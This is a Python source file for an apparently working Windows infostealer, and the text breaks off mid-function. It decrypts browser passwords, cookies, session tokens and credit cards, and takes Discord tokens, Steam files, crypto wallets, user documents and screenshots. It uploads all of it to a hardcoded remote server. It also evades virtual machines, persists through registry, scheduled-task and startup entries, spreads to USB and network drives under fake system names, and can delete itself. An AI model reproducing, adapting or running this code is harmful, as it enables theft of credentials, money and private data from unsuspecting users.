import os
import sys
import json
import base64
import shutil
import sqlite3
import socket
import ctypes
import subprocess
import platform
import datetime
import winreg
import glob
import re
import tempfile
import zipfile
import time
import random
import uuid
import struct
from urllib.request import Request, urlopen
from PIL import ImageGrab
from Crypto.Cipher import AES
import requests
from dataclasses import dataclass, field
from typing import List, Dict, Tuple, Optional

IS_FROZEN = getattr(sys, 'frozen', False)


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


MULTIPLIER = 2
TARGET_VARIABLE = "MULTIPLIER"


def get_base_path():
    if IS_FROZEN:
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))


def get_executable_path():
    if IS_FROZEN:
        return sys.executable
    else:
        return os.path.abspath(sys.argv[0])


BASE_DIR = get_base_path()
EXECUTABLE_PATH = get_executable_path()


def mutate_script(new_multiplier: int, output_file=None):
    current_file = EXECUTABLE_PATH
    if output_file is None:
        ext = ".exe" if IS_FROZEN else ".py"
        output_file = os.path.join(BASE_DIR, f"mutated_{random.randint(1000, 9999)}{ext}")

    try:
        shutil.copy2(current_file, output_file)
        return output_file, current_file
    except Exception as e:
        return None, None


def self_delete(file_path):
    try:
        if not os.path.exists(file_path):
            return

        if os.name == 'nt':
            bat_path = os.path.join(os.environ["TEMP"], f"delete_{random.randint(1000, 9999)}.bat")
            with open(bat_path, "w") as bat:
                bat.write(f'''@echo off
timeout /t 3 /nobreak > nul
del /f /q "{file_path}"
if exist "{file_path}" (
    timeout /t 2 /nobreak > nul
    del /f /q "{file_path}"
)
del /f /q "%~f0"
''')
            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.remove(file_path)
    except Exception as e:
        pass


@dataclass
class VMDetectionResult:
    is_vm: bool = False
    confidence: float = 0.0
    vm_type: Optional[str] = None
    indicators: List[str] = field(default_factory=list)
    details: Dict[str, str] = field(default_factory=dict)


def detect_vm(check_timing: bool = True, verbose: bool = False) -> VMDetectionResult:
    result = VMDetectionResult()
    score = 0.0
    MAX = 0.0

    def _add(weight, found, label=None, extra=None):
        nonlocal score, MAX
        MAX += weight
        if found:
            score += weight
            result.indicators.append(label or "?")
            if extra:
                result.details[label] = extra

    try:
        if platform.machine() in ("x86_64", "AMD64", "i386", "i686"):
            if platform.system() == "Windows":
                try:
                    out = subprocess.check_output(
                        "wmic cpu get name",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        timeout=5
                    ).decode().lower()
                    vm_keywords = ['vmware', 'virtualbox', 'qemu', 'kvm', 'hyper-v', 'xen']
                    for kw in vm_keywords:
                        if kw in out:
                            _add(0.35, True, "CPU-VM", kw)
                            result.vm_type = kw
                            break
                except:
                    pass
    except:
        pass

    try:
        mac = ":".join(re.findall("..", "%012x" % uuid.getnode()))
        vm_mac = {
            "00:0c:29": "VMware", "00:50:56": "VMware",
            "08:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
            "00:15:5d": "Hyper-V", "00:16:3e": "Xen"
        }
        prefix = mac[:8].lower()
        if prefix in vm_mac:
            _add(0.25, True, "MAC-Address", vm_mac[prefix])
            if not result.vm_type:
                result.vm_type = vm_mac[prefix]
    except:
        pass

    vm_files = [
        "C:\\Program Files\\VMware",
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions",
        "C:\\Windows\\System32\\vmGuestLib.dll",
        "/usr/bin/vmware-toolsd",
        "/usr/bin/vmtoolsd",
        "/usr/sbin/VBoxService",
        "/dev/vboxguest",
        "/dev/vmware"
    ]
    found_files = []
    for path in vm_files:
        if os.path.exists(path):
            found_files.append(os.path.basename(path))
    if found_files:
        _add(0.20, True, "VM-Artifacts", ", ".join(found_files[:3]))

    hostname = socket.gethostname().lower()
    vm_hostnames = ['vm', 'vbox', 'virtual', 'sandbox', 'kali', 'parrot', 'analyze', 'malware']
    for h in vm_hostnames:
        if h in hostname:
            _add(0.15, True, "Hostname", hostname)
            break

    vm_env = ['VBOX_INSTALL_PATH', 'VMWARE_USE_SHIPPED_LIBS', 'QEMU_AUDIO_DRV']
    for env in vm_env:
        if os.environ.get(env):
            _add(0.10, True, "Environment", env)
            break

    if platform.system() == "Windows":
        try:
            vm_reg_keys = [
                r"SOFTWARE\Oracle\VirtualBox Guest Additions",
                r"SOFTWARE\VMware, Inc.\VMware Tools",
                r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
            ]
            for key_path in vm_reg_keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    _add(0.15, True, "Registry", key_path.split('\\')[-1])
                    break
                except:
                    pass
        except:
            pass

    if check_timing:
        try:
            deltas = []
            for _ in range(200):
                t0 = time.perf_counter_ns()
                time.sleep(0)
                deltas.append(time.perf_counter_ns() - t0)
            avg_ns = sum(deltas) / len(deltas)
            if avg_ns > 5000:
                _add(0.10, True, "Timing-Anomaly", f"avg={avg_ns:.0f}ns")
        except:
            pass

    result.confidence = min(score / MAX, 1.0) if MAX > 0 else 0.0
    result.is_vm = result.confidence > 0.30
    return result


def do_mark(app_name: str, key_name: str = "HasRun") -> bool:
    try:
        registry_path = f"SOFTWARE\\{app_name}"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except:
        return False


def is_do(app_name: str, key_name: str = "HasRun") -> bool:
    try:
        registry_path = f"SOFTWARE\\{app_name}"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path)
        value, _ = winreg.QueryValueEx(key, key_name)
        winreg.CloseKey(key)
        return value == 1
    except:
        return False


LOG_DIR = os.path.join(BASE_DIR, "logs")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, f"stealer_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log")


def log(msg):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {msg}\n")
    except:
        pass


try:
    from win32 import win32crypt
except ImportError:
    win32crypt = None

MAX_FILE_SIZE = 24 * 1024 * 1024
APP_NAME = "coffie"


def safe(func, *args, **kwargs):
    try:
        return func(*args, **kwargs)
    except:
        return None


def copy_file_safe(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except:
        return False


def get_key(user_data):
    state = os.path.join(user_data, "Local State")
    if not os.path.isfile(state):
        return None
    try:
        with open(state, "r", encoding="utf-8") as f:
            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        if win32crypt:
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return None
    except Exception as e:
        log(f"Error getting key: {e}")
        return None


def decrypt(enc, key):
    if not enc:
        return None

    if win32crypt:
        try:
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8')
        except:
            pass

    if enc.startswith(b'v10'):
        try:
            nonce = enc[3:15]
            ciphertext = enc[15:]
            aes = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return aes.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:]).decode('utf-8', errors='ignore')
        except:
            return None

    return None


def extract_passwords_enhanced(browser_name, browser_path):
    if not os.path.isdir(browser_path):
        return []

    log(f"Scanning {browser_name} for passwords...")

    key = get_key(browser_path)
    if not key:
        log(f"Could not get encryption key for {browser_name}")
        return []

    profiles = [d for d in os.listdir(browser_path) if d.startswith("Default") or d.startswith("Profile")]
    if not profiles:
        profiles = ["Default"]

    all_passwords = []

    for profile in profiles:
        profile_path = os.path.join(browser_path, profile)
        login_db = os.path.join(profile_path, "Login Data")

        if not os.path.isfile(login_db):
            continue

        log(f"Profile: {profile} - Found Login Data")
        temp_db = os.path.join(tempfile.gettempdir(), f"login_{browser_name}_{profile}_{random.randint(1000, 9999)}.db")

        try:
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute("PRAGMA table_info(logins)")
            columns = [col[1] for col in cursor.fetchall()]

            required_cols = ['origin_url', 'username_value', 'password_value']
            if not all(col in columns for col in required_cols):
                conn.close()
                os.remove(temp_db)
                continue

            cursor.execute("""
                SELECT origin_url, username_value, password_value 
                FROM logins 
                WHERE password_value IS NOT NULL AND password_value != ''
            """)

            for row in cursor.fetchall():
                url = row[0] if row[0] else "Unknown URL"
                username = row[1] if row[1] else "No username"
                encrypted = row[2]

                password = decrypt(encrypted, key)
                if password:
                    all_passwords.append({
                        "browser": browser_name,
                        "profile": profile,
                        "url": url,
                        "username": username,
                        "password": password
                    })

            conn.close()

        except Exception as e:
            log(f"Error in {browser_name} {profile}: {e}")
        finally:
            try:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
            except:
                pass

    if len(all_passwords) > 0:
        log(f"Total passwords from {browser_name}: {len(all_passwords)}")
    else:
        log(f"No passwords found in {browser_name}")

    return all_passwords


def chromium(name, path, out):
    if not os.path.isdir(path):
        log(f"Browser not found: {name}")
        return

    log(f"Scanning {name}")
    profiles = [d for d in os.listdir(path) if d.startswith("Default") or d.startswith("Profile")] or ["Default"]
    key = get_key(path)
    if not key:
        log(f"Could not get encryption key for {name}")
        return

    br = os.path.join(out, name)
    os.makedirs(br, exist_ok=True)

    for prof in profiles:
        pp = os.path.join(path, prof)

        cdb = os.path.join(pp, "Network", "Cookies")
        if not os.path.isfile(cdb):
            cdb = os.path.join(pp, "Cookies")

        if os.path.isfile(cdb):
            tmp = os.path.join(br, f"ck_{prof}_{random.randint(1000, 9999)}.db")
            if copy_file_safe(cdb, tmp):
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()

                    cur.execute("PRAGMA table_info(cookies)")
                    columns = [col[1] for col in cur.fetchall()]

                    select_cols = []
                    for col in ['host_key', 'name', 'encrypted_value', 'path', 'expires_utc', 'is_secure']:
                        if col in columns:
                            select_cols.append(col)

                    if not select_cols:
                        conn.close()
                        safe(os.remove, tmp)
                        continue

                    query = f"SELECT {', '.join(select_cols)} FROM cookies"
                    cur.execute(query)

                    netscape, tokens = [], []

                    for row in cur.fetchall():
                        row_dict = dict(zip(select_cols, row))
                        host = row_dict.get('host_key', '')
                        name = row_dict.get('name', '')
                        enc_val = row_dict.get('encrypted_value', b'')
                        path = row_dict.get('path', '/')
                        exp = row_dict.get('expires_utc', 0)
                        sec = row_dict.get('is_secure', False)

                        dec = decrypt(enc_val, key)
                        if dec:
                            netscape.append(
                                f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{path}\t{'TRUE' if sec else 'FALSE'}\t{exp // 1000000 if exp else '0'}\t{name}\t{dec}")
                            if any(t in name.lower() for t in ('token', 'session', 'auth', 'sid')):
                                tokens.append(f"{host}\t{name}\t{dec}")

                    conn.close()

                    if netscape:
                        with open(os.path.join(br, f"cookies_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("# Netscape HTTP Cookie File\n" + "\n".join(netscape))
                        log(f"Saved {len(netscape)} cookies from {name}")
                    if tokens:
                        with open(os.path.join(br, f"tokens_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("\n".join(tokens))
                        log(f"Found {len(tokens)} tokens in {name}")
                except Exception as e:
                    log(f"Error processing cookies in {name}: {e}")
                safe(os.remove, tmp)

        ldb = os.path.join(pp, "Login Data")
        if os.path.isfile(ldb):
            tmp = os.path.join(br, f"lg_{prof}_{random.randint(1000, 9999)}.db")
            if copy_file_safe(ldb, tmp):
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()

                    cur.execute("PRAGMA table_info(logins)")
                    columns = [col[1] for col in cur.fetchall()]

                    required_cols = ['origin_url', 'username_value', 'password_value']
                    if all(col in columns for col in required_cols):
                        cur.execute(
                            "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL")
                        logins = []

                        for url, user, pw in cur.fetchall():
                            pwd = decrypt(pw, key)
                            if pwd:
                                logins.append(f"URL: {url}\nLogin: {user}\nPassword: {pwd}\n")

                        if logins:
                            with open(os.path.join(br, f"passwords_{prof}.txt"), "w", encoding="utf-8") as f:
                                f.write("\n".join(logins))
                            log(f"Saved {len(logins)} passwords from {name}")

                    conn.close()
                except Exception as e:
                    log(f"Error processing passwords in {name}: {e}")
                safe(os.remove, tmp)

        wdb = os.path.join(pp, "Web Data")
        if os.path.isfile(wdb):
            tmp = os.path.join(br, f"card_{prof}_{random.randint(1000, 9999)}.db")
            if copy_file_safe(wdb, tmp):
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    cards = []

                    for name, mo, yr, enc in cur.fetchall():
                        num = decrypt(enc, key)
                        if num:
                            cards.append(f"Name: {name}\nCard: {num}\nExp: {mo}/{yr}\n")
                    conn.close()

                    if cards:
                        with open(os.path.join(br, f"cards_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("\n".join(cards))
                        log(f"Saved {len(cards)} credit cards from {name}")
                except Exception as e:
                    log(f"Error processing cards in {name}: {e}")
                safe(os.remove, tmp)


def firefox(out):
    profs = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(profs):
        log("Firefox not found")
        return

    ff = os.path.join(out, "Firefox")
    os.makedirs(ff, exist_ok=True)

    for p in os.listdir(profs):
        pp = os.path.join(profs, p)
        for fn in ["logins.json", "key4.db", "key3.db", "cookies.sqlite", "places.sqlite"]:
            src = os.path.join(pp, fn)
            if os.path.isfile(src):
                safe(shutil.copy2, src, os.path.join(ff, f"{p}_{fn}"))
                log(f"Copied {fn} from Firefox")


def discord(out):
    toks = set()
    for app in ["discord", "discordptb", "discordcanary"]:
        ldb = os.path.join(os.environ["APPDATA"], app, "Local Storage", "leveldb")
        if os.path.isdir(ldb):
            for f in os.listdir(ldb):
                if f.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(ldb, f), "r", encoding="utf-8", errors="ignore") as fp:
                            data = fp.read()
                            found = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", data)
                            toks.update(found)
                    except:
                        pass

    if toks:
        d = os.path.join(out, "Discord")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "tokens.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(toks))
        log(f"Found {len(toks)} Discord tokens")
        return True
    log("No Discord tokens found")
    return False


def steam(out):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        sp = winreg.QueryValueEx(key, "SteamPath")[0]
        winreg.CloseKey(key)
    except:
        sp = r"C:\Program Files (x86)\Steam"

    if os.path.isdir(sp):
        st = os.path.join(out, "Steam")
        os.makedirs(st, exist_ok=True)

        for f in glob.glob(os.path.join(sp, "ssfn*")):
            safe(shutil.copy2, f, st)

        cfg = os.path.join(sp, "config", "config.vdf")
        if os.path.isfile(cfg):
            safe(shutil.copy2, cfg, st)

        with open(os.path.join(st, "steam_info.txt"), "w", encoding="utf-8") as sf:
            sf.write("Steam Guard bypass files (SSFN + config.vdf)\n")
        log("Steam data collected")
        return True
    log("Steam not found")
    return False


def wallets(out):
    paths = {
        "Exodus": os.path.join(os.environ["APPDATA"], "Exodus"),
        "Atomic": os.path.join(os.environ["APPDATA"], "atomic"),
        "Electrum": os.path.join(os.environ["APPDATA"], "Electrum"),
        "MetaMask": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default",
                                 "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "Phantom": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default",
                                "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    }
    wd = os.path.join(out, "Wallets")
    found = False
    for name, p in paths.items():
        if os.path.isdir(p):
            safe(shutil.copytree, p, os.path.join(wd, name))
            log(f"Found {name} wallet")
            found = True
    if not found:
        log("No wallets found")
    return found


def system(out):
    info = f"Host: {socket.gethostname()}\n"
    info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
    try:
        info += f"Public IP: {urlopen(Request('https://api.ipify.org'), timeout=10).read().decode()}\n"
    except:
        info += "Public IP: N/A\n"
    info += f"OS: {platform.platform()}\n"
    try:
        cpu = subprocess.check_output("wmic cpu get name", shell=True,
                                      creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")[1].strip()
        info += f"CPU: {cpu}\n"
    except:
        pass
    try:
        gpu = subprocess.check_output("wmic path win32_VideoController get name", shell=True,
                                      creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")[1].strip()
        info += f"GPU: {gpu}\n"
    except:
        pass
    try:
        ram = int(subprocess.check_output("wmic computersystem get TotalPhysicalMemory", shell=True,
                                          creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")[1].strip())
        info += f"RAM: {round(ram / 1024 ** 3, 2)} GB\n"
    except:
        pass

    with open(os.path.join(out, "system.txt"), "w", encoding="utf-8") as f:
        f.write(info)
    log("System info collected")


def grab_files(out):
    folders = [
        os.path.join(os.environ["USERPROFILE"], "Desktop"),
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Downloads")
    ]
    exts = [".txt", ".docx", ".xlsx", ".pdf", ".py", ".cpp", ".zip", ".jpg", ".png", ".kdbx", ".wallet"]
    fd = os.path.join(out, "Files")
    os.makedirs(fd, exist_ok=True)
    flist = []

    for folder in folders:
        if not os.path.exists(folder):
            continue
        for root, dirs, files in os.walk(folder):
            for f in files:
                if os.path.splitext(f)[1].lower() in exts:
                    full = os.path.join(root, f)
                    flist.append(full)
                    try:
                        dest = os.path.join(fd, os.path.relpath(full, folder).replace("\\", "_"))
                        shutil.copy2(full, dest)
                    except:
                        pass

    with open(os.path.join(out, "files_list.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(flist))
    log(f"Grabbed {len(flist)} files")


def screenshot(out):
    try:
        ImageGrab.grab(all_screens=True).save(os.path.join(out, "screenshot.png"))
        log("Screenshot taken")
    except Exception as e:
        log(f"Screenshot failed: {e}")


def send_info(data=None):
    URL = "https://server-sourse.onrender.com/send/embed"
    TOKEN = "5df35c87a76d8fc2f2bc2f931c344f5225a2afdeea2c9a267c2a1cb42769ebfc"

    if data is None:
        current_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        instructions = (
            f"**💀 New Log**\n"
            f"**PC:** {socket.gethostname()}\n"
            f"**Date:** {current_date}\n\n"
            "**📁 Data has been sent above.**\n"
        )
        data = {"content": instructions}

    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(URL, json=data, headers=headers, timeout=10)
        log(f"Send info - Status: {response.status_code}")
        if response.status_code == 200:
            log("Info sent successfully")
        else:
            log(f"Failed to send info: {response.text}")
        return response.status_code == 200, response.text
    except Exception as e:
        log(f"Error in send_info: {e}")
        return False, str(e)


def send_file_ds(file_path):
    URL = "https://server-sourse.onrender.com/send/file"
    TOKEN = "5df35c87a76d8fc2f2bc2f931c344f5225a2afdeea2c9a267c2a1cb42769ebfc"

    try:
        if not os.path.exists(file_path):
            log(f"File not found: {file_path}")
            return False, "File not found"

        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            log(f"File too large: {file_size} bytes")
            return False, f"File too large: {file_size}"

        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f, 'application/octet-stream')
            }
            data = {
                'username': 'File Bot',
                'avatar_url': 'https://cdn.discordapp.com/embed/avatars/1.png'
            }

            response = requests.post(
                URL,
                files=files,
                data=data,
                headers={"Authorization": f"Bearer {TOKEN}"},
                timeout=30
            )

        log(f"Send file - Status: {response.status_code}")
        if response.status_code == 200:
            log(f"File sent: {os.path.basename(file_path)}")
        else:
            log(f"Failed to send file: {response.text}")
        return response.status_code == 200, response.text

    except Exception as e:
        log(f"Error in send_file_ds: {e}")
        return False, str(e)


def create_and_send_zip(source_folder, zip_name, category_name):
    try:
        if not os.path.exists(source_folder):
            log(f"Source folder not found: {source_folder}")
            return False

        file_count = 0
        for root, dirs, files in os.walk(source_folder):
            file_count += len(files)

        if file_count == 0:
            log(f"No files in {source_folder}")
            return False

        log(f"Creating ZIP for {category_name} ({file_count} files)")

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_path = os.path.join(tempfile.gettempdir(), f"{zip_name}_{timestamp}_{random.randint(1000, 9999)}.zip")

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(source_folder):
                for file in files:
                    full = os.path.join(root, file)
                    arcname = os.path.relpath(full, source_folder)
                    zf.write(full, arcname)

        zip_size = os.path.getsize(zip_path)
        log(f"ZIP size: {zip_size / 1024 / 1024:.2f} MB")

        if zip_size <= MAX_FILE_SIZE:
            success, response = send_file_ds(zip_path)
            os.remove(zip_path)
            return success
        else:
            log(f"ZIP too large: {zip_size} bytes")
            os.remove(zip_path)
            return False

    except Exception as e:
        log(f"Error creating ZIP: {e}")
        return False


def get_network_drives():
    drives = []
    try:
        if os.name == 'nt':
            result = subprocess.check_output('net use', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode()
            for line in result.split('\n'):
                if ':' in line and 'Microsoft Windows Network' in line:
                    parts = line.split()
                    for part in parts:
                        if ':' in part and len(part) == 2:
                            drives.append(part)
    except:
        pass
    return drives


def get_removable_drives():
    drives = []
    try:
        if os.name == 'nt':
            try:
                import win32file
                drives = [d for d in win32file.GetLogicalDrives() if d]
            except:
                pass
    except:
        pass
    return drives


def add_to_startup(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        key_name = f"System_{random.randint(1000, 9999)}"
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{file_path}"')
        winreg.CloseKey(key)
        return True
    except:
        return False


def auto_deploy():
    log("STARTING AUTO-DEPLOYMENT")

    deployed = []
    current_file = EXECUTABLE_PATH
    current_name = os.path.basename(current_file)

    system_folders = [
        os.environ.get("APPDATA", ""),
        os.environ.get("LOCALAPPDATA", ""),
        os.environ.get("PROGRAMDATA", ""),
        os.path.join(os.environ.get("USERPROFILE", ""), "Documents"),
    ]

    fake_names = [
        "system_update.exe", "windows_service.exe", "chrome_update.exe",
        "svchost.exe", "winlogon.exe", "explorer.exe", "java_update.exe"
    ]

    for folder in system_folders:
        if not folder or not os.path.exists(folder):
            continue

        try:
            new_name = random.choice(fake_names)
            dest_path = os.path.join(folder, new_name)

            if os.path.exists(dest_path):
                name, ext = os.path.splitext(new_name)
                new_name = f"{name}_{random.randint(1000, 9999)}{ext}"
                dest_path = os.path.join(folder, new_name)

            shutil.copy2(current_file, dest_path)
            deployed.append({"path": dest_path, "name": new_name, "method": "system_folder"})
            log(f"Deployed to: {dest_path}")
            add_to_startup(dest_path)

        except Exception as e:
            log(f"Failed to deploy to {folder}: {e}")

    removable_drives = get_removable_drives()
    for drive in removable_drives:
        try:
            if drive and os.path.exists(drive):
                dest_path = os.path.join(drive, current_name)
                shutil.copy2(current_file, dest_path)
                deployed.append({"path": dest_path, "name": current_name, "method": "usb"})
                log(f"Deployed to USB: {drive}")
        except:
            pass

    network_drives = get_network_drives()
    for drive in network_drives:
        try:
            dest_path = os.path.join(drive, current_name)
            shutil.copy2(current_file, dest_path)
            deployed.append({"path": dest_path, "name": current_name, "method": "network"})
            log(f"Deployed to network: {dest_path}")
        except:
            pass

    log(f"Auto-deployment complete! ({len(deployed)} locations)")
    return deployed


def create_persistence():
    log("CREATING PERSISTENCE")

    persistence_methods = []

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        key_name = f"WindowsUpdate_{random.randint(1000, 9999)}"
        winreg.SetValueEx(
            key,
            key_name,
            0,
            winreg.REG_SZ,
            f'"{EXECUTABLE_PATH}"'
        )
        winreg.CloseKey(key)
        persistence_methods.append("registry_run")
        log("Added to Registry Run")
    except:
        pass

    try:
        task_name = f"WindowsUpdate_{random.randint(1000, 9999)}"
        subprocess.run([
            'schtasks', '/create', '/tn', task_name,
            '/tr', f'"{EXECUTABLE_PATH}"',
            '/sc', 'onlogon', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        persistence_methods.append("task_scheduler")
        log(f"Added to Task Scheduler: {task_name}")
    except:
        pass

    try:
        startup_folder = os.path.join(
            os.environ["APPDATA"],
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        if os.path.exists(startup_folder):
            shortcut_path = os.path.join(startup_folder, "SystemUpdater.lnk")
            ps_script = f'''
$WShell = New-Object -ComObject WScript.Shell
$Shortcut = $WShell.CreateShortcut("{shortcut_path}")
$Shortcut.TargetPath = "{EXECUTABLE_PATH}"
$Shortcut.Save()
'''
            subprocess.run(
                ['powershell', '-Command', ps_script],
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            persistence_methods.append("startup_folder")
            log("Added to Startup Folder")
    except:
        pass

    log(f"Persistence created: {', '.join(persistence_methods)}")
    return persistence_methods


def deploy_to_all():
    log("STARTING DEPLOYMENT SUITE")

    persistence = create_persistence()
    deployed = auto_deploy()

    report = {
        "timestamp": datetime.datetime.now().isoformat(),
        "persistence": persistence,
        "deployed_count": len(deployed),
        "deployed_locations": deployed
    }

    report_file = os.path.join(os.environ["TEMP"], "deployment_report.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    log(f"Deployment report: {report_file}")
    log("DEPLOYMENT COMPLETE")
    return report


def main():
    log("STARTING DATA EXTRACTION")

    current_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if MULTIPLIER == 2:
        log("First run - deploying...")
        deploy_to_all()

    timestamp_dir = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    BASE = os.path.join(tempfile.gettempdir(), f"wd_{timestamp_dir}_{random.randint(1000, 9999)}")
    os.makedirs(BASE, exist_ok=True)
    log(f"Base folder: {BASE}")

    all_passwords = []
    browsers_for_passwords = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
    }

    for name, path in browsers_for_passwords.items():
        passwords = extract_passwords_enhanced(name, path)
        all_passwords.extend(passwords)

    if all_passwords:
        passwords_file = os.path.join(BASE, "all_passwords.txt")
        with open(passwords_file, "w", encoding="utf-8") as f:
            f.write("EXTRACTED PASSWORDS\n")
            f.write("=" * 80 + "\n\n")
            for pwd in all_passwords:
                f.write(f"Browser: {pwd['browser']}\n")
                f.write(f"Profile: {pwd['profile']}\n")
                f.write(f"URL: {pwd['url']}\n")
                f.write(f"Username: {pwd['username']}\n")
                f.write(f"Password: {pwd['password']}\n")
                f.write("-" * 40 + "\n")

        log(f"Saved {len(all_passwords)} passwords to file")
        send_file_ds(passwords_file)

    browsers = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
        "Yandex": os.path.join(os.environ["LOCALAPPDATA"], "Yandex", "YandexBrowser", "User Data"),
        "Chromium": os.path.join(os.environ["LOCALAPPDATA"], "Chromium", "User Data"),
        "Vivaldi": os.path.join(os.environ["LOCALAPPDATA"], "Vivaldi", "User Data"),
    }

    br_out = os.path.join(BASE, "Browsers")
    for name, path in browsers.items():
        safe(chromium, name, path, br_out)

    safe(firefox, br_out)

    has_discord = discord(BASE)
    steam(BASE)
    wallets(BASE)
    system(BASE)
    grab_files(BASE)
    screenshot(BASE)

    if has_discord:
        disc_file = os.path.join(BASE, "Discord", "tokens.txt")
        if os.path.isfile(disc_file):
            send_file_ds(disc_file)

    browsers_creds_dir = os.path.join(BASE, "Browsers_creds")
    os.makedirs(browsers_creds_dir, exist_ok=True)

    for root, dirs, files in os.walk(br_out):
        for file in files:
            if file.endswith(".txt"):
                src = os.path.join(root, file)
                rel = os.path.relpath(root, br_out)
                dest_dir = os.path.join(browsers_creds_dir, rel)
                os.makedirs(dest_dir, exist_ok=True)
                safe(shutil.copy2, src, dest_dir)

    create_and_send_zip(browsers_creds_dir, "browsers_creds", "Browser credentials")

    steam_dir = os.path.join(BASE, "Steam")
    if os.path.isdir(steam_dir) and len(os.listdir(steam_dir)) > 0:
        create_and_send_zip(steam_dir, "steam", "Steam data")

    sys_dir = os.path.join(BASE, "System")
    os.makedirs(sys_dir, exist_ok=True)
    for fn in ["system.txt", "screenshot.png"]:
        src = os.path.join(BASE, fn)
        if os.path.isfile(src):
            safe(shutil.copy2, src, sys_dir)
    create_and_send_zip(sys_dir, "system", "System info & screenshot")

    wal_dir = os.path.join(BASE, "Wallets")
    if os.path.isdir(wal_dir) and len(os.listdir(wal_dir)) > 0:
